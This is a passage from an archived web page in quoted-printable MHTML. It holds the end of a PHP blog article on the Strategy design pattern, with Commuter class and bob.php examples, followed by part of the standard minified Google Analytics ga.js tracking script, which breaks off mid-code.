=3D <span class=3D"jush-php_var">$method</span>;
&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://w=
ww.php.net/control-structures.break">break</a>;
&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; }
&#xa0; &#xa0; &#xa0; &#xa0; }

&#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://www.php.net/control-structure=
s.if">if</a> (!<a href=3D"http://www.php.net/function.isset">isset</a>(<spa=
n class=3D"jush-php_var">$this</span><span class=3D"jush-php_fun">-&gt;_str=
ategy</span>)) {
&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://www.php.net/lan=
guage.exceptions">throw</a> <span class=3D"jush-php_new"><a href=3D"http://=
www.php.net/language.oop5.basic#language.oop5.basic.new">new</a><span class=
=3D"jush-op"> </span><a href=3D"http://www.php.net/class.exception">Excepti=
on</a></span>(<span class=3D"jush-php_apo"><span class=3D"jush-op">&#x27;</=
span>No transport methods available<span class=3D"jush-op">&#x27;</span></s=
pan>);
&#xa0; &#xa0; &#xa0; &#xa0; }
&#xa0; &#xa0; }

&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span>travel</span>(Loc=
ation <span class=3D"jush-php_var">$location</span>)
&#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://www.php.net/control-structure=
s.if">if</a> (<span class=3D"jush-php_var">$this</span><span class=3D"jush-=
php_fun">-&gt;_strategy</span>) {
&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://www.php.net/fun=
ction.return">return</a> <span class=3D"jush-php_var">$this</span><span cla=
ss=3D"jush-php_fun">-&gt;_strategy</span><span class=3D"jush-php_fun">-&gt;=
travel</span>(<span class=3D"jush-php_var">$location</span>);
&#xa0; &#xa0; &#xa0; &#xa0; }

&#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://www.php.net/function.return">=
return</a> false;
&#xa0; &#xa0; }=20
}
</span></span></pre>

<p><em>bob.php</em>   </p>

<pre class=3D"jush"><span class=3D"jush"><span class=3D"jush-php"><span cla=
ss=3D"jush-op">&lt;?php</span>=20

<span class=3D"jush-php_var">$bob</span> =3D <span class=3D"jush-php_new"><=
a href=3D"http://www.php.net/language.oop5.basic#language.oop5.basic.new">n=
ew</a><span class=3D"jush-op"> </span>Commuter</span>();

<a href=3D"http://www.php.net/control-structures.if">if</a> (<span class=3D=
"jush-php_var">$bob</span><span class=3D"jush-php_fun">-&gt;travel</span>(<=
span class=3D"jush-php_met">Map<span class=3D"jush-op">::</span>getLocation=
</span>(<span class=3D"jush-php_apo"><span class=3D"jush-op">&#x27;</span>w=
ork<span class=3D"jush-op">&#x27;</span></span>))) {
&#xa0; &#xa0; <span class=3D"jush-php_one"><span class=3D"jush-op">//</span=
> Bob got to work, nobody cares how :-) &#xa0; &#xa0;<span class=3D"jush-op=
">
</span></span>}
</span></span></pre>

<p>As you can see, Bob is created as an instance of the Commuter class whic=
h stores a copy of it&#x27;s $_strategy object. This object is then used wh=
en our Commuter wants to travel anywhere. You can assume that the Location=
 and Map classes are implemented elsewhere as their implementation is not=
 strictly relevant to this actual example.</p>

<p>One point to note from the code above is the $_strategies array inside=
 the Commuter class represents a preference order of all possible strategie=
s, and the commuter will use the first one that is available. Also, the met=
hod for selecting which strategy to use is not defined as part of this desi=
gn pattern, and it would have been equally as valid to pass the strategy to=
 the class on construction, however if the strategy was provided to the tra=
vel method then this would actually be more akin to the Visitor pattern.</p>

<h3>Possible uses</h3>

<p>So, the Strategy Pattern can be used when you have to perform an action=
 but don&#x27;t care about how that action is actually performed. We&#x27;v=
e found this pattern useful, for example, in a caching class and implemente=
d different strategies for Memcached, APC, or a DB cache and the system wou=
ld then use whichever was available.</p>

<p>I hope you have found this article informative, and keep an eye out for=
 the next one!</p>

<p>Comments welcome on twitter, <a href=3D"http://twitter.com/labelmedia">@=
labelmedia</a> :-)</p>
</div>

<div class=3D"hr"><hr></div>
<p><a class=3D"more" href=3D"./">=C2=AB Back to blog index</a></p></div></d=
iv></div></div></body></html>
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://www.google-analytics.com/ga.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

(function(){var g=3Dvoid 0,h=3D!0,Ge=3Dnull,l=3D!1,aa=3DencodeURIComponent,=
ba=3DInfinity,ca=3DsetTimeout,da=3DisNaN,m=3DMath,ea=3DdecodeURIComponent;f=
unction He(a,b){return a.onload=3Db}function Ie(a,b){return a.onerror=3Db}f=
unction ha(a,b){return a.name=3Db}
var n=3D"push",ia=3D"test",ja=3D"slice",p=3D"replace",ka=3D"load",la=3D"flo=
or",ma=3D"charAt",na=3D"value",q=3D"indexOf",oa=3D"match",pa=3D"port",qa=3D=
"createElement",ra=3D"path",r=3D"name",u=3D"host",v=3D"toString",w=3D"lengt=
h",x=3D"prototype",sa=3D"clientWidth",y=3D"split",ta=3D"stopPropagation",ua=
=3D"scope",z=3D"location",va=3D"search",Je=3D"random",A=3D"protocol",wa=3D"=
clientHeight",xa=3D"href",B=3D"substring",ya=3D"apply",za=3D"navigator",C=
=3D"join",D=3D"toLowerCase",E;function Aa(a,b){switch(b){case 0:return""+a;=
case 1:return 1*a;case 2:return!!a;case 3:return 1E3*a}return a}function Ba=
(a){return"function"=3D=3Dtypeof a}function Ca(a){return a!=3Dg&&-1<(a.cons=
tructor+"")[q]("String")}function F(a,b){return g=3D=3Da||"-"=3D=3Da&&!b||"=
"=3D=3Da}function Da(a){if(!a||""=3D=3Da)return"";for(;a&&-1<" \n\r\t"[q](a=
[ma](0));)a=3Da[B](1);for(;a&&-1<" \n\r\t"[q](a[ma](a[w]-1));)a=3Da[B](0,a[=
w]-1);return a}function Ea(){return m.round(2147483647*m[Je]())}function Fa=
(){}
function G(a,b){if(aa instanceof Function)return b?encodeURI(a):aa(a);H(68)=
;return escape(a)}function I(a){a=3Da[y]("+")[C](" ");if(ea instanceof Func=
tion)try{return ea(a)}catch(b){H(17)}else H(68);return unescape(a)}var Ga=
=3Dfunction(a,b,c,d){a.addEventListener?a.addEventListener(b,c,!!d):a.attac=
hEvent&&a.attachEvent("on"+b,c)},Ha=3Dfunction(a,b,c,d){a.removeEventListen=
er?a.removeEventListener(b,c,!!d):a.detachEvent&&a.detachEvent("on"+b,c)};
function Ia(a,b){if(a){var c=3DJ[qa]("script");c.type=3D"text/javascript";c=
.async=3Dh;c.src=3Da;c.id=3Db;var d=3DJ.getElementsByTagName("script")[0];d=
.parentNode.insertBefore(c,d);return c}}function K(a){return a&&0<a[w]?a[0]=
:""}function L(a){var b=3Da?a[w]:0;return 0<b?a[b-1]:""}var Ja=3Dfunction()=
{this.prefix=3D"ga.";this.R=3D{}};Ja[x].set=3Dfunction(a,b){this.R[this.pre=
fix+a]=3Db};Ja[x].get=3Dfunction(a){return this.R[this.prefix+a]};Ja[x].con=
tains=3Dfunction(a){return this.get(a)!=3D=3Dg};function Ne(){return"https:=
"=3D=3DJ[z][A]}function Ka(a){0=3D=3Da[q]("www.")&&(a=3Da[B](4));return a[D=
]()}
function La(a,b){var c,d=3D{url:a,protocol:"http",host:"",path:"",d:new Ja,=
anchor:""};if(!a)return d;c=3Da[q]("://");0<=3Dc&&(d.protocol=3Da[B](0,c),a=
=3Da[B](c+3));c=3Da[va]("/|\\?|#");if(0<=3Dc)d.host=3Da[B](0,c)[D](),a=3Da[=
B](c);else return d.host=3Da[D](),d;c=3Da[q]("#");0<=3Dc&&(d.anchor=3Da[B](=
c+1),a=3Da[B](0,c));c=3Da[q]("?");0<=3Dc&&(Na(d.d,a[B](c+1)),a=3Da[B](0,c))=
;d.anchor&&b&&Na(d.d,d.anchor);a&&"/"=3D=3Da[ma](0)&&(a=3Da[B](1));d.path=
=3Da;return d}
function Oa(a,b){function c(a){var b=3D(a.hostname||"")[y](":")[0][D](),c=
=3D(a[A]||"")[D](),c=3D1*a[pa]||("http:"=3D=3Dc?80:"https:"=3D=3Dc?443:"");=
a=3Da.pathname||"";0=3D=3Da[q]("/")||(a=3D"/"+a);return[b,""+c,a]}var d=3Db=
||J[qa]("a");d.href=3DJ[z][xa];var e=3D(d[A]||"")[D](),f=3Dc(d),Be=3Dd[va]|=
|"",k=3De+"//"+f[0]+(f[1]?":"+f[1]:"");0=3D=3Da[q]("//")?a=3De+a:0=3D=3Da[q=
]("/")?a=3Dk+a:!a||0=3D=3Da[q]("?")?a=3Dk+f[2]+(a||Be):0>a[y]("/")[0][q](":=
")&&(a=3Dk+f[2][B](0,f[2].lastIndexOf("/"))+"/"+a);d.href=3Da;e=3Dc(d);retu=
rn{protocol:(d[A]||"")[D](),host:e[0],
port:e[1],path:e[2],Oa:d[va]||"",url:a||""}}function Na(a,b){function c(b,c=
){a.contains(b)||a.set(b,[]);a.get(b)[n](c)}for(var d=3DDa(b)[y]("&"),e=3D0=
;e<d[w];e++)if(d[e]){var f=3Dd[e][q]("=3D");0>f?c(d[e],"1"):c(d[e][B](0,f),=
d[e][B](f+1))}}function Pa(a,b){if(F(a)||"["=3D=3Da[ma](0)&&"]"=3D=3Da[ma](=
a[w]-1))return"-";var c=3DJ.domain;return a[q](c+(b&&"/"!=3Db?b:""))=3D=3D(=
0=3D=3Da[q]("http://")?7:0=3D=3Da[q]("https://")?8:0)?"0":a};var Qa=3D0;fun=
ction Ra(a,b,c){!(1<=3DQa)&&!(1<=3D100*m[Je]())&&(a=3D["utmt=3Derror","utme=
rr=3D"+a,"utmwv=3D5.4.0","utmn=3D"+Ea(),"utmsp=3D1"],b&&a[n]("api=3D"+b),c&=
&a[n]("msg=3D"+G(c[B](0,100))),M.w&&a[n]("aip=3D1"),Sa(a[C]("&")),Qa++)};va=
r Ta=3D0,Ua=3D{};function N(a){return Va("x"+Ta++,a)}function Va(a,b){Ua[a]=
=3D!!b;return a}
var Wa=3DN(),Xa=3DVa("anonymizeIp"),Ya=3DN(),$a=3DN(),ab=3DN(),bb=3DN(),O=
=3DN(),P=3DN(),cb=3DN(),db=3DN(),eb=3DN(),fb=3DN(),gb=3DN(),hb=3DN(),ib=3DN=
(),jb=3DN(),kb=3DN(),lb=3DN(),nb=3DN(),ob=3DN(),pb=3DN(),qb=3DN(),rb=3DN(),=
sb=3DN(),tb=3DN(),ub=3DN(),vb=3DN(),wb=3DN(),xb=3DN(),yb=3DN(),zb=3DN(),Ab=
=3DN(),Bb=3DN(),Cb=3DN(),Db=3DN(),Eb=3DN(),Fb=3DN(h),Gb=3DVa("currencyCode"=
),Hb=3DVa("page"),Ib=3DVa("title"),Jb=3DN(),Kb=3DN(),Lb=3DN(),Mb=3DN(),Nb=
=3DN(),Ob=3DN(),Pb=3DN(),Qb=3DN(),Rb=3DN(),Q=3DN(h),Sb=3DN(h),Tb=3DN(h),Ub=
=3DN(h),Vb=3DN(h),Wb=3DN(h),Zb=3DN(h),$b=3DN(h),ac=3DN(h),bc=3DN(h),cc=3DN(=
h),R=3DN(h),dc=3DN(h),ec=3DN(h),fc=3D
N(h),gc=3DN(h),hc=3DN(h),ic=3DN(h),jc=3DN(h),S=3DN(h),kc=3DN(h),lc=3DN(h),m=
c=3DN(h),nc=3DN(h),oc=3DN(h),pc=3DN(h),qc=3DN(h),rc=3DVa("campaignParams"),=
sc=3DN(),tc=3DVa("hitCallback"),uc=3DN();N();var vc=3DN(),wc=3DN(),xc=3DN()=
,yc=3DN(),zc=3DN(),Ac=3DN(),Bc=3DN(),Cc=3DN(),Dc=3DN(),Ec=3DN(),Fc=3DN(),Gc=
=3DN(),Hc=3DN(),Ic=3DN();N();var Mc=3DN(),Nc=3DN(),Oc=3DN(),Oe=3DVa("uaName=
"),Pe=3DVa("uaDomain"),Qe=3DVa("uaPath");var Re=3Dfunction(){function a(a,c=
,d){T($[x],a,c,d)}a("_createTracker",$[x].r,55);a("_getTracker",$[x].oa,0);=
a("_getTrackerByName",$[x].u,51);a("_getTrackers",$[x].pa,130);a("_anonymiz=
eIp",$[x].aa,16);a("_forceSSL",$[x].la,125);a("_getPlugin",Pc,120)},Se=3Dfu=
nction(){function a(a,c,d){T(U[x],a,c,d)}Qc("_getName",$a,58);Qc("_getAccou=
nt",Wa,64);Qc("_visitCode",Q,54);Qc("_getClientInfo",ib,53,1);Qc("_getDetec=
tTitle",lb,56,1);Qc("_getDetectFlash",jb,65,1);Qc("_getLocalGifPath",wb,57)=
;Qc("_getServiceMode",
xb,59);V("_setClientInfo",ib,66,2);V("_setAccount",Wa,3);V("_setNamespace",=
Ya,48);V("_setAllowLinker",fb,11,2);V("_setDetectFlash",jb,61,2);V("_setDet=
ectTitle",lb,62,2);V("_setLocalGifPath",wb,46,0);V("_setLocalServerMode",xb=
,92,g,0);V("_setRemoteServerMode",xb,63,g,1);V("_setLocalRemoteServerMode",=
xb,47,g,2);V("_setSampleRate",vb,45,1);V("_setCampaignTrack",kb,36,2);V("_s=
etAllowAnchor",gb,7,2);V("_setCampNameKey",ob,41);V("_setCampContentKey",tb=
,38);V("_setCampIdKey",nb,39);V("_setCampMediumKey",
rb,40);V("_setCampNOKey",ub,42);V("_setCampSourceKey",qb,43);V("_setCampTer=
mKey",sb,44);V("_setCampCIdKey",pb,37);V("_setCookiePath",P,9,0);V("_setMax=
CustomVariables",yb,0,1);V("_setVisitorCookieTimeout",cb,28,1);V("_setSessi=
onCookieTimeout",db,26,1);V("_setCampaignCookieTimeout",eb,29,1);V("_setRef=
errerOverride",Jb,49);V("_setSiteSpeedSampleRate",Dc,132);a("_trackPageview=
",U[x].Fa,1);a("_trackEvent",U[x].F,4);a("_trackPageLoadTime",U[x].Ea,100);=
a("_trackSocial",U[x].Ga,104);a("_trackTrans",U[x].Ia,
18);a("_sendXEvent",U[x].t,78);a("_createEventTracker",U[x].ia,74);a("_getV=
ersion",U[x].qa,60);a("_setDomainName",U[x].B,6);a("_setAllowHash",U[x].va,=
8);a("_getLinkerUrl",U[x].na,52);a("_link",U[x].link,101);a("_linkByPost",U=
[x].ua,102);a("_setTrans",U[x].za,20);a("_addTrans",U[x].$,21);a("_addItem"=
,U[x].Y,19);a("_clearTrans",U[x].ea,105);a("_setTransactionDelim",U[x].Aa,8=
2);a("_setCustomVar",U[x].wa,10);a("_deleteCustomVar",U[x].ka,35);a("_getVi=
sitorCustomVar",U[x].ra,50);a("_setXKey",U[x].Ca,83);
a("_setXValue",U[x].Da,84);a("_getXKey",U[x].sa,76);a("_getXValue",U[x].ta,=
77);a("_clearXKey",U[x].fa,72);a("_clearXValue",U[x].ga,73);a("_createXObj"=
,U[x].ja,75);a("_addIgnoredOrganic",U[x].W,15);a("_clearIgnoredOrganic",U[x=
].ba,97);a("_addIgnoredRef",U[x].X,31);a("_clearIgnoredRef",U[x].ca,32);a("=
_addOrganic",U[x].Z,14);a("_clearOrganic",U[x].da,70);a("_cookiePathCopy",U=
[x].ha,30);a("_get",U[x].ma,106);a("_set",U[x].xa,107);a("_addEventListener=
",U[x].addEventListener,108);a("_removeEventListener",
U[x].removeEventListener,109);a("_addDevId",U[x].V);a("_getPlugin",Pc,122);=
a("_setPageGroup",U[x].ya,126);a("_trackTiming",U[x].Ha,124);a("_initData",=
U[x].v,2);a("_setVar",U[x].Ba,22);V("_setSessionTimeout",db,27,3);V("_setCo=
okieTimeout",eb,25,3);V("_setCookiePersistence",cb,24,1);a("_setAutoTrackOu=
tbound",Fa,79);a("_setTrackOutboundSubdomains",Fa,81);a("_setHrefExamineLim=
it",Fa,80)};function Pc(a){var b=3Dthis.plugins_;if(b)return b.get(a)}
var T=3Dfunction(a,b,c,d){a[b]=3Dfunction(){try{return d!=3Dg&&H(d),c[ya](t=
his,arguments)}catch(a){throw Ra("exc",b,a&&a[r]),a;}}},Qc=3Dfunction(a,b,c=
,d){U[x][a]=3Dfunction(){try{return H(c),Aa(this.a.get(b),d)}catch(e){throw=
 Ra("exc",a,e&&e[r]),e;}}},V=3Dfunction(a,b,c,d,e){U[x][a]=3Dfunction(f){tr=
y{H(c),e=3D=3Dg?this.a.set(b,Aa(f,d)):this.a.set(b,e)}catch(Be){throw Ra("e=
xc",a,Be&&Be[r]),Be;}}},Te=3Dfunction(a,b){return{type:b,target:a,stopPropa=
gation:function(){throw"aborted";}}};var Rc=3DRegExp(/(^|\.)doubleclick\.ne=
t$/i),Sc=3Dfunction(a,b){return Rc[ia](J[z].hostname)?h:"/"!=3D=3Db?l:(0=3D=
=3Da[q]("www.google.")||0=3D=3Da[q](".google.")||0=3D=3Da[q]("google."))&&!=
(-1<a[q]("google.org"))?h:l},Tc=3Dfunction(a){var b=3Da.get(bb),c=3Da.c(P,"=
/");Sc(b,c)&&a[ta]()};var Zc=3Dfunction(){var a=3D{},b=3D{},c=3Dnew Uc;this=
.g=3Dfunction(a,b){c.add(a,b)};var d=3Dnew Uc;this.e=3Dfunction(a,b){d.add(=
a,b)};var e=3Dl,f=3Dl,Be=3Dh;this.T=3Dfunction(){e=3Dh};this.j=3Dfunction(a=
){this[ka]();this.set(sc,a,h);a=3Dnew Vc(this);e=3Dl;d.execute(this);e=3Dh;=
b=3D{};this.n();a.Ja()};this.load=3Dfunction(){e&&(e=3Dl,this.Ka(),Wc(this)=
,f||(f=3Dh,c.execute(this),Xc(this),Wc(this)),e=3Dh)};this.n=3Dfunction(){i=
f(e)if(f)e=3Dl,Xc(this),e=3Dh;else this[ka]()};this.get=3Dfunction(c){Ua[c]=
&&this[ka]();return b[c]!=3D=3Dg?b[c]:a[c]};this.set=3D
function(c,d,e){Ua[c]&&this[ka]();e?b[c]=3Dd:a[c]=3Dd;Ua[c]&&this.n()};this=
.Za=3Dfunction(b){a[b]=3Dthis.b(b,0)+1};this.b=3Dfunction(a,b){var c=3Dthis=
.get(a);return c=3D=3Dg||""=3D=3D=3Dc?b:1*c};this.c=3Dfunction(a,b){var c=
=3Dthis.get(a);return c=3D=3Dg?b:c+""};this.Ka=3Dfunction(){if(Be){var b=3D=
this.c(bb,""),c=3Dthis.c(P,"/");Sc(b,c)||(a[O]=3Da[hb]&&""!=3Db?Yc(b):1,Be=
=3Dl)}}};Zc[x].stopPropagation=3Dfunction(){throw"aborted";};
var Vc=3Dfunction(a){var b=3Dthis;this.q=3D0;var c=3Da.get(tc);this.Ua=3Dfu=
nction(){0<b.q&&c&&(b.q--,b.q||c())};this.Ja=3Dfunction(){!b.q&&c&&ca(c,10)=
};a.set(uc,b,h)};function $c(a,b){b=3Db||[];for(var c=3D0;c<b[w];c++){var=
 d=3Db[c];if(""+a=3D=3Dd||0=3D=3Dd[q](a+"."))return d}return"-"}
var bd=3Dfunction(a,b,c){c=3Dc?"":a.c(O,"1");b=3Db[y](".");if(6!=3D=3Db[w]|=
|ad(b[0],c))return l;c=3D1*b[1];var d=3D1*b[2],e=3D1*b[3],f=3D1*b[4];b=3D1*=
b[5];if(!(0<=3Dc&&0<d&&0<e&&0<f&&0<=3Db))return l;a.set(Q,c);a.set(Vb,d);a.=
set(Wb,e);a.set(Zb,f);a.set($b,b);return h},cd=3Dfunction(a){var b=3Da.get(=
Q),c=3Da.get(Vb),d=3Da.get(Wb),e=3Da.get(Zb),f=3Da.b($b,1);return[a.b(O,1),=
b!=3Dg?b:"-",c||"-",d||"-",e||"-",f][C](".")},dd=3Dfunction(a){return[a.b(O=
,1),a.b(cc,0),a.b(R,1),a.b(dc,0)][C](".")},ed=3Dfunction(a,b,c){c=3Dc?"":a.=
c(O,"1");var d=3Db[y](".");
if(4!=3D=3Dd[w]||ad(d[0],c))d=3DGe;a.set(cc,d?1*d[1]:0);a.set(R,d?1*d[2]:10=
);a.set(dc,d?1*d[3]:a.get(ab));return d!=3DGe||!ad(b,c)},fd=3Dfunction(a,b)=
{var c=3DG(a.c(Tb,"")),d=3D[],e=3Da.get(Fb);if(!b&&e){for(var f=3D0;f<e[w];=
f++){var Be=3De[f];Be&&1=3D=3DBe[ua]&&d[n](f+"=3D"+G(Be[r])+"=3D"+G(Be[na])=
+"=3D1")}0<d[w]&&(c+=3D"|"+d[C]("^"))}return c?a.b(O,1)+"."+c:Ge},gd=3Dfunc=
tion(a,b,c){c=3Dc?"":a.c(O,"1");b=3Db[y](".");if(2>b[w]||ad(b[0],c))return=
 l;b=3Db[ja](1)[C](".")[y]("|");0<b[w]&&a.set(Tb,I(b[0]));if(1>=3Db[w])retu=
rn h;b=3Db[1][y](-1=3D=3D
b[1][q](",")?"^":",");for(c=3D0;c<b[w];c++){var d=3Db[c][y]("=3D");if(4=3D=
=3Dd[w]){var e=3D{};ha(e,I(d[1]));e.value=3DI(d[2]);e.scope=3D1;a.get(Fb)[d=
[0]]=3De}}return h},hd=3Dfunction(a,b){var c=3DUe(a,b);return c?[a.b(O,1),a=
.b(ec,0),a.b(fc,1),a.b(gc,1),c][C]("."):""},Ue=3Dfunction(a){function b(b,e=
){if(!F(a.get(b))){var f=3Da.c(b,""),f=3Df[y](" ")[C]("%20"),f=3Df[y]("+")[=
C]("%20");c[n](e+"=3D"+f)}}var c=3D[];b(ic,"utmcid");b(nc,"utmcsr");b(S,"ut=
mgclid");b(kc,"utmgclsrc");b(lc,"utmdclid");b(mc,"utmdsid");b(jc,"utmccn");=
b(oc,"utmcmd");
b(pc,"utmctr");b(qc,"utmcct");return c[C]("|")},id=3Dfunction(a,b,c){c=3Dc?=
"":a.c(O,"1");b=3Db[y](".");if(5>b[w]||ad(b[0],c))return a.set(ec,g),a.set(=
fc,g),a.set(gc,g),a.set(ic,g),a.set(jc,g),a.set(nc,g),a.set(oc,g),a.set(pc,=
g),a.set(qc,g),a.set(S,g),a.set(kc,g),a.set(lc,g),a.set(mc,g),l;a.set(ec,1*=
b[1]);a.set(fc,1*b[2]);a.set(gc,1*b[3]);Ve(a,b[ja](4)[C]("."));return h},Ve=
=3Dfunction(a,b){function c(a){return(a=3Db[oa](a+"=3D(.*?)(?:\\|utm|$)"))&=
&2=3D=3Da[w]?a[1]:g}function d(b,c){c?(c=3De?I(c):c[y]("%20")[C](" "),
a.set(b,c)):a.set(b,g)}-1=3D=3Db[q]("=3D")&&(b=3DI(b));var e=3D"2"=3D=3Dc("=
utmcvr");d(ic,c("utmcid"));d(jc,c("utmccn"));d(nc,c("utmcsr"));d(oc,c("utmc=
md"));d(pc,c("utmctr"));d(qc,c("utmcct"));d(S,c("utmgclid"));d(kc,c("utmgcl=
src"));d(lc,c("utmdclid"));d(mc,c("utmdsid"))},ad=3Dfunction(a,b){return b?=
a!=3Db:!/^\d+$/[ia](a)};var Uc=3Dfunction(){this.filters=3D[]};Uc[x].add=3D=
function(a,b){this.filters[n]({name:a,s:b})};Uc[x].execute=3Dfunction(a){tr=
y{for(var b=3D0;b<this.filters[w];b++)this.filters[b].s.call(W,a)}catch(c){=
}};function jd(a){100!=3Da.get(vb)&&a.get(Q)%1E4>=3D100*a.get(vb)&&a[ta]()}=
function kd(a){ld(a.get(Wa))&&a[ta]()}function md(a){"file:"=3D=3DJ[z][A]&&=
a[ta]()}function nd(a){a.get(Ib)||a.set(Ib,J.title,h);a.get(Hb)||a.set(Hb,J=
[z].pathname+J[z][va],h)};var od=3Dnew function(){var a=3D[];this.set=3Dfun=
ction(b){a[b]=3Dh};this.Xa=3Dfunction(){for(var b=3D[],c=3D0;c<a[w];c++)a[c=
]&&(b[m[la](c/6)]=3Db[m[la](c/6)]^1<<c%6);for(c=3D0;c<b[w];c++)b[c]=3D"ABCD=
EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"[ma](b[c]||0);=
return b[C]("")+"~"}};function H(a){od.set(a)};var W=3Dwindow,J=3Ddocument,=
ld=3Dfunction(a){var b=3DW._gaUserPrefs;return b&&b.ioo&&b.ioo()||!!a&&W["g=
a-disable-"+a]=3D=3D=3Dh},We=3Dfunction(a,b){ca(a,b)},pd=3Dfunction(a){var=
 b=3D[],c=3DJ.cookie[y](";");a=3DRegExp("^\\s*"+a+"=3D\\s*(.*?)\\s*$");for(=
var d=3D0;d<c[w];d++){var e=3Dc[d][oa](a);e&&b[n](e[1])}return b},X=3Dfunct=
ion(a,b,c,d,e,f){e=3Dld(e)?l:Sc(d,c)?l:h;if(e){if(b&&0<=3DW[za].userAgent[q=
]("Firefox")){b=3Db[p](/\n|\r/g," ");e=3D0;for(var Be=3Db[w];e<Be;++e){var=
 k=3Db.charCodeAt(e)&255;if(10=3D=3Dk||13=3D=3Dk)b=3Db[B](0,e)+"?"+b[B](e+1=
)}}b&&
2E3<b[w]&&(b=3Db[B](0,2E3),H(69));a=3Da+"=3D"+b+"; path=3D"+c+"; ";f&&(a+=
=3D"expires=3D"+(new Date((new Date).getTime()+f)).toGMTString()+"; ");d&&(=
a+=3D"domain=3D"+d+";");J.cookie=3Da}};var qd,rd,sd=3Dfunction(){if(!qd){va=
r a=3D{},b=3DW[za],c=3DW.screen;a.Q=3Dc?c.width+"x"+c.height:"-";a.P=3Dc?c.=
colorDepth+"-bit":"-";a.language=3D(b&&(b.language||b.browserLanguage)||"-"=
)[D]();a.javaEnabled=3Db&&b.javaEnabled()?1:0;a.characterSet=3DJ.characterS=
et||J.charset||"-";try{var d;var e=3DJ.documentElement,f=3DJ.body,Be=3Df&&f=
[sa]&&f[wa],b=3D[];e&&(e[sa]&&e[wa])&&("CSS1Compat"=3D=3D=3DJ.compatMode||!=
Be)?b=3D[e[sa],e[wa]]:Be&&(b=3D[f[sa],f[wa]]);d=3D0>=3Db[0]||0>=3Db[1]?"":b=
[C]("x");a.Wa=3Dd}catch(k){H(135)}qd=3Da}},td=3Dfunction(){sd();
for(var a=3Dqd,b=3DW[za],a=3Db.appName+b.version+a.language+b.platform+b.us=
erAgent+a.javaEnabled+a.Q+a.P+(J.cookie?J.cookie:"")+(J.referrer?J.referrer=
:""),b=3Da[w],c=3DW.history[w];0<c;)a+=3Dc--^b++;return Yc(a)},ud=3Dfunctio=
n(a){sd();var b=3Dqd;a.set(Lb,b.Q);a.set(Mb,b.P);a.set(Pb,b.language);a.set=
(Qb,b.characterSet);a.set(Nb,b.javaEnabled);a.set(Rb,b.Wa);if(a.get(ib)&&a.=
get(jb)){if(!(b=3Drd)){var c,d,e;d=3D"ShockwaveFlash";if((b=3D(b=3DW[za])?b=
.plugins:g)&&0<b[w])for(c=3D0;c<b[w]&&!e;c++)d=3Db[c],-1<d[r][q]("Shockwave=
 Flash")&&
(e=3Dd.description[y]("Shockwave Flash ")[1]);else{d=3Dd+"."+d;try{c=3Dnew=
 ActiveXObject(d+".7"),e=3Dc.GetVariable("$version")}catch(f){}if(!e)try{c=
=3Dnew ActiveXObject(d+".6"),e=3D"WIN 6,0,21,0",c.AllowScriptAccess=3D"alwa=
ys",e=3Dc.GetVariable("$version")}catch(Be){}if(!e)try{c=3Dnew ActiveXObjec=
t(d),e=3Dc.GetVariable("$version")}catch(k){}e&&(e=3De[y](" ")[1][y](","),e=
=3De[0]+"."+e[1]+" r"+e[2])}b=3De?e:"-"}rd=3Db;a.set(Ob,rd)}else a.set(Ob,"=
-")};var vd=3Dfunction(a){if(Ba(a))this.s=3Da;else{var b=3Da[0],c=3Db.lastI=
ndexOf(":"),d=3Db.lastIndexOf(".");this.h=3Dthis.i=3Dthis.l=3D"";-1=3D=3Dc&=
&-1=3D=3Dd?this.h=3Db:-1=3D=3Dc&&-1!=3Dd?(this.i=3Db[B](0,d),this.h=3Db[B](=
d+1)):-1!=3Dc&&-1=3D=3Dd?(this.l=3Db[B](0,c),this.h=3Db[B](c+1)):c>d?(this.=
i=3Db[B](0,d),this.l=3Db[B](d+1,c),this.h=3Db[B](c+1)):(this.i=3Db[B](0,d),=
this.h=3Db[B](d+1));this.k=3Da[ja](1);this.Ma=3D!this.l&&"_require"=3D=3Dth=
is.h;this.J=3D!this.i&&!this.l&&"_provide"=3D=3Dthis.h}},Y=3Dfunction(){T(Y=
[x],"push",Y[x][n],5);T(Y[x],"_getPlugin",Pc,121);T(Y[x],
"_createAsyncTracker",Y[x].Sa,33);T(Y[x],"_getAsyncTracker",Y[x].Ta,34);thi=
s.I=3Dnew Ja;this.p=3D[]};E=3DY[x];E.Na=3Dfunction(a,b,c){var d=3Dthis.I.ge=
t(a);if(!Ba(d))return l;b.plugins_=3Db.plugins_||new Ja;b.plugins_.set(a,ne=
w d(b,c||{}));return h};E.push=3Dfunction(a){var b=3DZ.Va[ya](this,argument=
s),b=3DZ.p.concat(b);for(Z.p=3D[];0<b[w]&&!Z.O(b[0])&&!(b.shift(),0<Z.p[w])=
;);Z.p=3DZ.p.concat(b);return 0};E.Va=3Dfunction(a){for(var b=3D[],c=3D0;c<=
arguments[w];c++)try{var d=3Dnew vd(arguments[c]);d.J?this.O(d):b[n](d)}cat=
ch(e){}return b};
E.O=3Dfunction(a){try{if(a.s)a.s[ya](W);else if(a.J)this.I.set(a.k[0],a.k[1=
]);else{var b=3D"_gat"=3D=3Da.i?M:"_gaq"=3D=3Da.i?Z:M.u(a.i);if(a.Ma){if(!t=
his.Na(a.k[0],b,a.k[2])){if(!a.Pa){var c=3DOa(""+a.k[1]);var d=3Dc[A],e=3DJ=
[z][A];var f;if(f=3D"https:"=3D=3Dd||d=3D=3De?h:"http:"!=3Dd?l:"http:"=3D=
=3De){var Be;a:{var k=3DOa(J[z][xa]);if(!(c.Oa||0<=3Dc.url[q]("?")||0<=3Dc[=
ra][q]("://")||c[u]=3D=3Dk[u]&&c[pa]=3D=3Dk[pa]))for(var s=3D"http:"=3D=3Dc=
